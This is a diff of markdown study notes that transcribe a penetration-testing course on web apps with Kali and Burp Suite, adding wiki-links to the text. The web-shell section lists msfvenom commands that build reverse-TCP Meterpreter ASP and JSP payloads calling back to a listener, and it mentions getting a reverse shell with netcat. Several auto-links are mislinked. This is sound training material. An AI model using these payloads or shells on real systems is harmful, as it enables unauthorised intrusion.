-> **[2:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=146)** A website exists as folders on a host with the homepage of the website on a typical Linux Apache installation being located at /var/www/html.
+> **[2:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=146)** A website exists as folders on a host with the homepage of the website on a typical [[Linux]] Apache installation being located at /var/www/html.
 >
-> **[2:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=158)** And on a typical Windows installation of IIS being in /inetpub/wwwroot.
+> **[2:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=158)** And on a typical [[Windows]] installation of IIS being in /inetpub/wwwroot.
 >
 > **[2:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=168)** The hypertext markup language, HTML, is the basic building block of a website.
 >
@@ -586,7 +578,7 @@ created: 2026-05-02
 >
 > **[3:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=238)** This can be included in the page or more usually in its own file external to the HTML file.
 >
-> **[4:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=245)** The full external styling approach is known as cascading style sheets.
+> **[4:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=245)** The full external styling approach is known as [[Cascading Style Sheets (CSS)|cascading style sheets]].
 >
 > **[4:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=250)** We'll also see tables and forms appearing in many web pages, particularly those that we're interested in as a tester.
 >
@@ -594,7 +586,7 @@ created: 2026-05-02
 >
 > **[4:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=266)** Forms have their own form tag and are constructed with various elements to enable data input and often have the div elements which define areas of the page.
 >
-> **[4:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=278)** There are also XML, PHP, and JavaScript tags which allow active code to be included in web pages.
+> **[4:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=278)** There are also XML, [[PHP]], and [[JavaScript]] tags which allow active code to be included in web pages.
 >
 > **[4:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=286)** Here's an example of a call to an external JavaScript file and an embedded line of JavaScript code.
 >
@@ -630,7 +622,7 @@ created: 2026-05-02
 >
 > **[6:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=413)** Omitting the file name will cause the default first page to be returned.
 >
-> **[6:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=418)** The HEAD request is used in the same way as GET, but will download just the header or metadata.
+> **[6:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=418)** The HEAD request is used in the same way as GET, but will download just the header or [[Metadata]].
 >
 > **[7:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=424)** This is commonly done to check the last modified data of the page and check against a local-cached copy.
 >
@@ -672,7 +664,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (18), data (10), web application (9), [[HTML]] (9), application (5)
+> **Frameworks & Libraries:** [[HTML]] (9), [[Forms]] (5), [[PHP]] (4), [[JavaScript]] (3), [[Web Servers]] (2)
 > **Env Vars:** http (10), html (7), php (4), https (3), wss (1)
 > **Definitions:** is a  (5), known as (2), is an  (2), means that (1)
 > **API Endpoints:** get  (2), head  (1), post  (1), options  (1), put  (1)
@@ -681,12 +673,11 @@ created: 2026-05-02
 > **Ports:** port 80 (1), port 43 (1)
 > **Prerequisites:** set up (2)
 
-#### Refreshing your basic web testing skills
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980)
+#### [Refreshing your basic web testing skills](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=0)** - [Instructor] In my Hacking Web Servers and Web Applications course.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=0)** - [Instructor] In my Hacking [[Web Servers]] and Web Applications course.
 >
 > **[0:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=4)** We not only learned about web technology, but also about web testing tools and techniques.
 >
@@ -712,15 +703,15 @@ created: 2026-05-02
 >
 > **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=68)** The basic web server details such as the version of Apache are the same, of course.
 >
-> **[1:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=74)** The nikto tool provides a basic level of vulnerability analysis.
+> **[1:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=74)** The [[Nikto]] tool provides a basic level of vulnerability analysis.
 >
 > **[1:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=78)** And we can also run this against mutillidae.
 >
 > **[1:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=82)** Nikto -h [http://192.168.1.176/mutillidae](http://192.168.1.176/mutillidae).
 >
-> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=95)** Here we get the same basic server information, the Linux and Apache versions, but we also get a long list of possible vulnerabilities with their reference in the open source, vulnerability database.
+> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=95)** Here we get the same basic server information, the [[Linux]] and Apache versions, but we also get a long list of possible vulnerabilities with their reference in the open source, vulnerability database.
 >
-> **[1:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=110)** We might carry out an automated scan of a website using the OWASP ZAP tool.
+> **[1:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=110)** We might carry out an automated scan of a website using the [[OWASP]] ZAP tool.
 >
 > **[1:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=116)** We can select automated scan and enter the URL, which is 192.168.1.176/mutillidae,
 >
@@ -746,7 +737,7 @@ created: 2026-05-02
 >
 > **[3:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=186)** And here we get not only our message, but also a listing of all accounts on the system.
 >
-> **[3:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=192)** SQL injection is another common injection attack, which we can see in mutillidae.
+> **[3:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=192)** [[SQL]] injection is another common injection attack, which we can see in mutillidae.
 >
 > **[3:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=201)** Here we have a log on page, so let's try to log in as admin.
 >
@@ -764,7 +755,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (10), application (2), traffic (1), [[Linux]] (1), database (1)
+> **Frameworks & Libraries:** [[Nikto]] (3), [[Web Servers]] (1), [[Linux]] (1), [[OWASP]] (1), [[SQL]] (1)
 > **Env Vars:** url (3), owasp (1), zap (1), sql (1)
 > **CLI Commands:** apache (2), cat (1)
 > **Versions:** 192.168.1 (3)
@@ -773,26 +764,25 @@ created: 2026-05-02
 > **Definitions:** is a  (1)
 > **Analogies:** such as (1)
 
-#### A refresher on website shell implants
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980)
+#### [A refresher on website shell implants](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=0)** - [Instructor] When web testing, we will often follow an exploitation chain that starts with gaining administrative access to the web server, then allow its user shell to be gained on the target, and then we escalate privileges to gain root control.
 >
-> **[0:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=16)** An initial web shell will typically use one of the many forms of active scripting code.
+> **[0:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=16)** An initial web shell will typically use one of the many [[Forms]] of active scripting code.
 >
 > **[0:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=22)** Consequently, we need a variety of shells on hand to include in our exploits and to use as standalone modules to deliver shells.
 >
 > **[0:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=30)** Because different targets will have different forms of active code, we need to have as many web shells available as possible.
 >
-> **[0:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=38)** We need to be able to upload our shell file into a folder which is remotely URL accessible for Linux Apache.
+> **[0:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=38)** We need to be able to upload our shell file into a folder which is remotely URL accessible for [[Linux]] Apache.
 >
-> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=46)** This is typically in /var/www/ or one of its descendant folders such as /var/www/html.
+> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=46)** This is typically in /var/www/ or one of its descendant folders such as /var/www/[[HTML]].
 >
-> **[0:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=55)** For Windows IIS, this is typically in \inetpub\wwwroot\.
+> **[0:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=55)** For [[Windows]] IIS, this is typically in \inetpub\wwwroot\.
 >
-> **[1:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=61)** Other web servers will have their own default directories.
+> **[1:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=61)** Other [[Web Servers]] will have their own default directories.
 >
 > **[1:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=65)** ColdFusion, for example, has a CFIDE folder at the webroot in which content is placed.
 >
@@ -802,7 +792,7 @@ created: 2026-05-02
 >
 > **[1:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=79)** Ls /usr/share/webshells.
 >
-> **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=89)** Here we can see folders for ASP, ASPX, CFM, JSP, Laudanum, PERL, and PHP.
+> **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=89)** Here we can see folders for ASP, ASPX, CFM, JSP, Laudanum, PERL, and [[PHP]].
 >
 > **[1:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=96)** These all contain different variants of the same basic shell approach.
 >
@@ -832,7 +822,7 @@ created: 2026-05-02
 >
 > **[3:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=180)** Two other forms of shell we might find useful are ASP and ASPX.
 >
-> **[3:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=186)** ASP is an older technology but is a default part of older Microsoft IIS websites.
+> **[3:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=186)** ASP is an older technology but is a default part of older [[Microsoft]] IIS websites.
 >
 > **[3:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=193)** Let's look at the ASP shells. ASP.
 >
@@ -848,7 +838,7 @@ created: 2026-05-02
 >
 > **[3:52](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=232)** This is a single command reverse shell, again using a command field on the browser.
 >
-> **[3:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=238)** These web shells run in the browser and don't give us a reverse command shell to work in, but we can issue individual commands or we can potentially execute netcat to connect a listener and get a reverse shell.
+> **[3:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=238)** These web shells run in the browser and don't give us a reverse command shell to work in, but we can issue individual commands or we can potentially execute [[Netcat]] to connect a listener and get a reverse shell.
 >
 > **[4:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=252)** Let's check the JSP web shells.
 >
@@ -858,7 +848,7 @@ created: 2026-05-02
 >
 > **[4:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=263)** Sudo nano /usr/share /webshells/jsp /cmdjsp.jsp.
 >
-> **[4:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=280)** This shell can work either on a Linux server or a Windows server.
+> **[4:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=280)** This shell can work either on a Linux server or a [[Windows Server]].
 >
 > **[4:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=286)** As it notes at the top, the executable needs to be changed to reflect the target before deployment.
 >
@@ -874,19 +864,19 @@ created: 2026-05-02
 >
 > **[5:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=325)** It's a variant to the PHP script that we saw.
 >
-> **[5:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=332)** MSF Venom is one of the most important tools which Kali provides, and it can generate a variety of web shells.
+> **[5:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=332)** [[Metasploit|MSF]] Venom is one of the most important tools which Kali provides, and it can generate a variety of web shells.
 >
 > **[5:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=339)** We can create ASP payloads using the minus F switch to specify ASP format.
 >
 > **[5:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=346)** For example, we can create a Meterpreter ASP payload with Shikata-Ga-Nai encoding.
 >
-> **[5:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=354)** Msfvenom -p windows/meterpreter/ reverse_tcp LHOST=10.0.2.18 LPORT=2222 -e x86 /shikata_ga_nai
+> **[5:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=354)** [[Metasploit|Msfvenom]] -p windows/meterpreter/ reverse_tcp LHOST=10.0.2.18 LPORT=2222 -e x86 /shikata_ga_nai
 >
 > **[6:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=388)** - f asp and we'll store that as met.asp.
 >
 > **[6:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=397)** We can similarly create GSP payloads to reverse connect back to a command shell.
 >
-> **[6:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=403)** Msfvenom -p java/ jsp_shell_reverse_tcp
+> **[6:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=403)** Msfvenom -p [[Java]]/ jsp_shell_reverse_tcp
 >
 > **[6:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=419)** LHOST=10.0.2.18 LPORT=2222 -f raw and we'll save that as cmd.jsp.
 >
@@ -896,7 +886,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (12), [[PHP]] (8), [[Forms]] (3), [[Windows]] (3), [[Linux]] (2)
+> **Frameworks & Libraries:** [[PHP]] (8), [[Forms]] (3), [[Windows]] (3), [[Linux]] (2), [[Web Servers]] (2)
 > **Env Vars:** asp (15), aspx (4), jsp (4), php (4), iis (3)
 > **CLI Commands:** php (8), sudo (3), apache (1), ls (1), find (1)
 > **Versions:** 10.0.2 (4), 5.1 (2)
@@ -910,8 +900,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Busting open a website
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980)
+#### [Busting open a website](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -941,15 +930,15 @@ created: 2026-05-02
 >
 > **[1:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=79)** There's no content accessible from the main webpage and no indication of additional pages.
 >
-> **[1:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=86)** Kali provides a command line tool called Gobuster to do dictionary based testing to identify additional pages on a website.
+> **[1:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=86)** Kali provides a command line tool called [[Gobuster]] to do dictionary based testing to identify additional pages on a website.
 >
 > **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=95)** Let's run Gobuster on this site and use one of Kali's pre-loaded dictionaries.
 >
-> **[1:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=101)** The two basic parameters we need to provide are the URL or IP address and the word list to use for the dictionary attack.
+> **[1:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=101)** The two basic parameters we need to provide are the URL or IP address and the [[Microsoft Word|word]] list to use for the dictionary attack.
 >
 > **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=109)** We can also use the X switch to look for specific types of files.
 >
-> **[1:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=113)** We'll check for PHP files.
+> **[1:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=113)** We'll check for [[PHP]] files.
 >
 > **[1:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=116)** Gobuster dlr
 >
@@ -959,7 +948,7 @@ created: 2026-05-02
 >
 > **[2:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=143)** /directory-list-lowercase-2.3-medium.txt.
 >
-> **[2:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=153)** We quickly find that there's an index folder as well as folders for WordPress and Joomla.
+> **[2:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=153)** We quickly find that there's an index folder as well as folders for [[WordPress]] and Joomla.
 >
 > **[2:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=160)** The scan doesn't find Mytilidae as this isn't a word contained in the dictionary we are using.
 >
@@ -967,15 +956,15 @@ created: 2026-05-02
 >
 > **[2:52](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=172)** Let's take a look at that.
 >
-> **[2:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=175)** This provides a fair bit of detail of the system configuration.
+> **[2:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=175)** This provides a fair bit of detail of the [[System Configuration]].
 >
-> **[2:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=178)** We can see it's using PHP version 7.4 on a Ubuntu 20.04 server.
+> **[2:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=178)** We can see it's using PHP version 7.4 on a [[Ubuntu]] 20.04 server.
 >
-> **[3:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=185)** We can see in the details pane, that it's using the Linux 5.15 kernel.
+> **[3:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=185)** We can see in the details pane, that it's using the [[Linux]] 5.15 kernel.
 >
 > **[3:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=192)** Further down, we see details of the web environment.
 >
-> **[3:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=195)** Including configuration details for my SQL and OpenSSL.
+> **[3:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=195)** Including configuration details for my [[SQL]] and OpenSSL.
 >
 > **[3:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=200)** This is very useful information for us, so that we can scope out the kind of testing we might look at conducting once we finish reconnaissance.
 >
@@ -1013,7 +1002,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[PHP]] (6), [[Microsoft Word|Word]] (3), management (1), [[WordPress]] (1), [[System Configuration]] (1)
+> **Frameworks & Libraries:** [[Gobuster]] (6), [[PHP]] (6), [[Microsoft Word|Word]] (3), [[WordPress]] (1), [[System Configuration]] (1)
 > **CLI Commands:** find (8), php (6), apache (2)
 > **Versions:** 192.168.1 (2), 2.3 (2), 192.168.60 (2), version 7 (1), 20.04 (1)
 > **Env Vars:** php (4), url (2), sql (1)
@@ -1022,8 +1011,7 @@ created: 2026-05-02
 > **Tools:** command line (1)
 > **Analogies:** such as (1)
 
-#### Identifying virtual websites
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980)
+#### [Identifying virtual websites](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1043,7 +1031,7 @@ created: 2026-05-02
 >
 > **[0:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=53)** We can see here two websites which we would connect to, not with the IP address, but with their names [example1.com](https://example1.com) and [example2.com](https://example2.com).
 >
-> **[1:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=64)** As a penetration tester, finding all the vhosts that run on a host is important because any one of these websites may contain vulnerabilities that allow access to the underlying server and hence, all of the web servers being run.
+> **[1:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=64)** As a penetration tester, finding all the vhosts that run on a host is important because any one of these websites may contain vulnerabilities that allow access to the underlying server and hence, all of the [[Web Servers]] being run.
 >
 > **[1:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=80)** Unfortunately, identifying the server is a name site server and identifying the websites on it is a challenge and not something that appears immediately obvious with standard enumeration.
 >
@@ -1061,7 +1049,7 @@ created: 2026-05-02
 >
 > **[2:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=126)** In this case, we know that the server is named Cronos and that it's a host server in the Hack The Box domain.
 >
-> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=133)** Let's try using the name cronos.htb.
+> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=133)** Let's try using the name cronos.[[HackTheBox|htb]].
 >
 > **[2:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=137)** We need to resolve the name into its IP address.
 >
@@ -1103,7 +1091,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (4), dns (1)
+> **Frameworks & Libraries:** [[HackTheBox|Htb]] (11), [[Web Servers]] (1)
 > **CLI Commands:** find (4), apache (3), make (1), sudo (1)
 > **Env Vars:** url (3), dns (1), axfr (1)
 > **Definitions:** is a  (4)
@@ -1112,8 +1100,7 @@ created: 2026-05-02
 > **Warnings:** be aware (1)
 > **Speakers:** - [instructor] (1)
 
-#### More ways to find web pages
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980)
+#### [More ways to find web pages](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1123,7 +1110,7 @@ created: 2026-05-02
 >
 > **[0:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=13)** DirBuster is a graphical interface for doing a dictionary or brute force attack on a website to identify new top level pages.
 >
-> **[0:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=21)** It's the gooey form of Gobuster.
+> **[0:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=21)** It's the gooey form of [[Gobuster]].
 >
 > **[0:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=25)** Let's use it to take a look at the offensive security target called Lampião.
 >
@@ -1135,7 +1122,7 @@ created: 2026-05-02
 >
 > **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=63)** We'll use the same lowercase dictionary as before and we'll go into user, share, wordlists, DirBuster, and our directory-list-lowercase-medium.
 >
